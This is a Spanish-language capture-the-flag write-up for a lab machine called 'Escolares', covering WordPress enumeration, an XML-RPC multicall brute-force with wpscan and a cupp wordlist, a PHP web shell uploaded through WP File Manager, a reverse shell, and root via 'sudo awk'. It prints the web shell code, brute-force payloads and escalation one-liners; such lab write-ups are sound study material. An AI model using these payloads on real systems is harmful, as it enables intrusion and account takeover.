#CTF #wordpress #wpscan #cupp #bruteforce #awk 

## Enumeración

- Escaneamos la IP target con nmap.
- `sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -vvv 172.18.0.2 -oN nmapscan` 

![[Pasted image 20240611190308.png]]

Tiene los puertos 22 (SSH) y 80 (HTTP) abiertos, veamos qué hay en la pagina web.

![[Pasted image 20240611190645.png]]

La pagina parece ser de una Universidad, éste índex solo parece mostrar un texto en latín, sin embargo hay mas pestañas.

En "Alumnado", "Escolares", "Carreras" y "Contacto" no parece haber nada relevante.
En "Profesores" hay una lista con datos de profesores, y una pista que nos indica que "Luis" es admin de Wordpress.

![[Pasted image 20240611191511.png]]

Seguimos explorando la pagina haciendo fuzzing con `gobuster`.

- `gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,sh,py,txt -u "172.18.0.2"`

![[Pasted image 20240611191822.png]]

Gobuster encuentra varios directorios, si intentamos entrar a http://172.18.0.2/wordpress, se nos quedará en estado de carga con el mensaje de "Connecting to escolares.dl"
Esto es una señal de que debemos añadir ese dominio a nuestro archivo `/etc/hosts`.

![[Pasted image 20240611192230.png]]

![[Pasted image 20240611192821.png]]

Una vez añadido el dominio, cargamos la pagina.

![[Pasted image 20240611200240.png]]

Nos muestra otra página, aparentemente de administración, si bajamos podremos ver como hay un post de un usuario llamado "luisillo".

![[Pasted image 20240611200435.png]]

Seguimos fuzzeando en /wordpress.

![[Pasted image 20240611193330.png]]

Antes de nada intentamos entrar a wp-login.php. (Ya que gobuster había reportado un error).

![[Pasted image 20240611194548.png]]

Tarda en cargar pero nos termina mostrando el login, bien, sabemos que funciona. 

Vemos que nos reporta el contenido de /wordpress, el wp-login.php que da error, y un archivo **xmlrpc.php** el cual es posible que podamos usar para logearnos en Wordpress. (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc)

Veamos que hay en **xmlrpc.php**.

![[Pasted image 20240611194805.png]]

XML-RPC acepta solo acepta peticiones POST.

---
## Explotación

### ¿Qué es XML-RPC?

**XML-RPC** es un protocolo que utiliza XML para codificar sus llamadas y HTTP como mecanismo de transporte. En el contexto de WordPress, `xmlrpc.php` es un archivo que habilita la funcionalidad de XML-RPC, permitiendo que aplicaciones remotas interactúen con WordPress, por ejemplo, para publicar contenido desde un cliente de blogging remoto.

#### ¿Por Qué es Vulnerable?

La vulnerabilidad principal de `xmlrpc.php` reside en su capacidad de manejar múltiples métodos (`wp.getUsersBlogs`, `system.listMethods`, `system.getCapabilities`) y, en particular, el método `system.multicall`, que permite agrupar múltiples llamadas en una sola petición. Esto puede ser explotado para realizar ataques de fuerza bruta a las credenciales de usuario de una manera más eficiente que con intentos individuales, ya que se pueden probar múltiples combinaciones de usuario/contraseña en una sola solicitud HTTP.

Para hacer este ataque XML-RPC se pueden usar scripts de bruteforce en bash, python... etc. (Ejemplo de Mario con Maquina Internal (THM) https://www.youtube.com/watch?v=PnH4uwY0X9U)

El hecho de que `xmlrpc.php` acepte peticiones POST no es una prueba de que pueda ser explotado para un ataque de fuerza bruta de credenciales, sin embargo, éste nos puede indicar el potencial para tal ataque.
Para saber si el **xmlrpc.php** es realmente vulnerable a ataques de fuerza bruta, necesitamos hacer unas pruebas viendo como se comporta el tramite de peticiones.

#### Prueba de verificación de vulnerabilidad

Si hacemos una petición POST con `curl` a http://172.18.0.2/xmlrpc.php con este payload XML y nos devuelve los métodos del sistema, estaríamos interactuando con el servidor.
- `curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://172.18.0.2/xmlrpc.php`

![[Pasted image 20240611203259.png]]

Nos devuelve una lista de todos los metodos con los que podemos interactuar. Esto significa que es vulnerable.

---
## PoC

En lo que se basaría el bruteforce sería en enviar multiples llamadas como la que acabamos de hacer pero usando el metodo `system.multicall` y con el siguiente payload:

``` 
# ESTE PAYLOAD SERÍA UNA PETICIÓN

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>USER</value></param> 
<param><value>PASS</value></param> 
</params> 
</methodCall>
```

``` 
# ESTE PAYLOAD SERÍA CON VARIAS PETICIONES POR LLAMADA
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><array><data>
                          <value><string>USER</string></value>
                          <value><string>PASS</string></value>
                        </data></array></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><array><data>
                          <value><string>USER</string></value>
                          <value><string>PASS</string></value>
                        </data></array></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <!-- Agrega más combinaciones aquí -->
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>

```

#### Opción script (Via opcional)

Todo esto puede ser automatizado con bash o python como había especificado antes. (Ejemplo de Mario con Maquina Internal (THM) https://www.youtube.com/watch?v=PnH4uwY0X9U)

#### Opción WPScan (Via usada en este Write-Up)

`WPScan` es una herramienta que se usa para escanear Wordpress en busca de vulnerabilidades, también puede usarse para explotarlas, yo voy a usarla como exploit para el **XML-RPC** ya que hacer un script para el ataque me dió problemas. (WPScan tiene una opción específicamente para hacer bruteforce XML-RPC).
Antes de hacer el ataque, lo recomendable es hacer una enumeración primero, en este caso haré una enumeración de usuarios y plugins agresiva (`-e p --plugins-detection aggressive`) .

- `wpscan --url http://escolares.dl/wordpress -e u,p --plugins-detection aggressive`

```js
# WPScan Output
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://escolares.dl/wordpress/ [172.18.0.2]
[+] Started: Tue Jun 11 15:08:27 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://escolares.dl/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://escolares.dl/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://escolares.dl/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://escolares.dl/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Latest, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://escolares.dl/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://escolares.dl/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://escolares.dl/wordpress/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.1 (up to date)
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://escolares.dl/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://escolares.dl/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://escolares.dl/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:09 <======================================================================================================> (1498 / 1498) 100.00% Time: 00:00:09
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://escolares.dl/wordpress/wp-content/plugins/akismet/
 | Latest Version: 5.3.2
 | Last Updated: 2024-05-31T16:57:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://escolares.dl/wordpress/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] luisillo
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://escolares.dl/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Sitemap (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jun 11 15:09:51 2024
[+] Requests Done: 1554
[+] Cached Requests: 9
[+] Data Sent: 454.537 KB
[+] Data Received: 1.179 MB
[+] Memory used: 230.879 MB
[+] Elapsed time: 00:01:23

```

`WPScan` nos lista **XML-RPC**, la versión de Wordpress, y entre otras cosas, el theme, los plugins y un usuario "luisillo", efectivamente el usuario que habíamos encontrado antes existe, ahora es momento de lanzar el ataque de fuerza bruta, en este caso usaremos el diccionario rockyou.txt.

- `wpscan --url http://172.18.0.2/wordpress/ -U luisillo -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc`

![[Pasted image 20240611212303.png]]

Desafortunadamente, usar el diccionario rockyou.txt no es la vía intencionada de ésta maquina, deberemos hacer nuestro propio diccionario usando `cupp` con los pocos datos que tenemos sobre la página/usuarios. 
`cupp` es un script de generación de diccionarios, en el que podemos darle datos sobre nuestra victima y nos generará un diccionario con diferentes combinaciones de contraseñas.
En este caso, vamos a intentar obtener toda la información posible de "luisillo", la página http:172.18.0.2/profesores.html que habíamos visitado antes contiene información que nos puede ser útil para usar con `cupp`.

![[Pasted image 20240611213217.png]]

- `cupp -i` (E introducimos los datos que tenemos)

![[Pasted image 20240611213620.png]]

Ahora tenemos nuestro propio diccionario para hacer fuerza bruta a una posible contraseña de Luis.

- `wpscan --url http://172.18.0.2/wordpress/ -U luisillo -P ~/Desktop/Dockerlabs/Escolares/luis.txt --password-attack xmlrpc`

![[Pasted image 20240611214032.png]]

`wpscan` encontró la contraseña, "Luis1981", probémosla en el login de Wordpress.

![[Pasted image 20240611214336.png]]
![[Pasted image 20240611214617.png]]

Bien! Estamos dentro, el siguiente paso es conseguir una reverse shell, lo que mas llama la atención a primera vista una vez dentro de la página de administración es ese "WP File Manager", veamos qué es.

![[Pasted image 20240611214858.png]]

Pues efectivamente es un File Manager muy intuitivo a la vista. Veamos si podemos subir un archivo, en este caso intentaremos subir un archivo .php malicioso para ganar acceso remoto.

```php
<?php
if (isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>
```

Si creamos el archivo malicioso en nuestro escritorio y lo arrastramos a File Manager, ya estará subido.

![[Pasted image 20240611215406.png]]

- Cuando entramos a la página nuestro archivo malicioso, nos pide un comando, pero debe ser ejecutado desde la URL con el parametro "cmd", por ejemplo http://escolares.dl/wordpress/shell.php?cmd=whoami
- 
![[Pasted image 20240611215539.png]]
![[Pasted image 20240611215713.png]]

Ya estaríamos ejecutando código en la maquina victima, ahora a conseguir la reverse shell.

Hacemos URL encode de nuestro código de reverse shell y nos ponemos a la escucha con `netcat` (yo uso el encoder de Burp Suite)

![[Pasted image 20240611231309.png]]
![[Pasted image 20240611231614.png]]

Copiamos y pegamos el codigo URL-encoded en la URL y deberíamos obtener la reverse shell. (Mientras tanto la pagina web queda en estado de carga)

![[Pasted image 20240611231957.png]]

Hacemos tratamiento de la TTY

- `script /dev/null -c bash`
- `stty raw -echo;fg` 
- `export TERM=xterm`
- `export shell=bash`
- `reset xterm`

Entramos al directorio /home y podemos encontrar un archivo secret.txt que parece contener una contraseña.

![[Pasted image 20240611233337.png]]

Checkeando el directorio /tmp podemos encontrar otro archivo secreto si hacemos `ls -la`, en este caso parece ser una cadena de caracteres en base64.

![[Pasted image 20240611233612.png]]
![[Pasted image 20240611171608.png]]

Intentamos leer /etc/passwd y vemos que hay un usuario con /bin/bash "luisillo"

![[Pasted image 20240611234000.png]]

Probamos a hacer `su luisillo` con las credenciales encontradas anteriormente y accedemos al user "luisillo".

- `find / -perm -4000 2>/dev/null` No nos lista ningun binario con el que podamos escalar privilegios.

![[Pasted image 20240611234400.png]]

- `sudo -l`

![[Pasted image 20240611234521.png]]

Podemos ejecutar /usr/bin/awk como root haciendo `sudo /usr/bin/awk`, veamos como escalar privilegios con `awk` en https://gtfobins.github.io/

![[Pasted image 20240611234807.png]]

Podemos escalar privilegios ejecutando `sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'`, esto abrirá una shell con los permisos de root de `awk`.

![[Pasted image 20240611235301.png]]

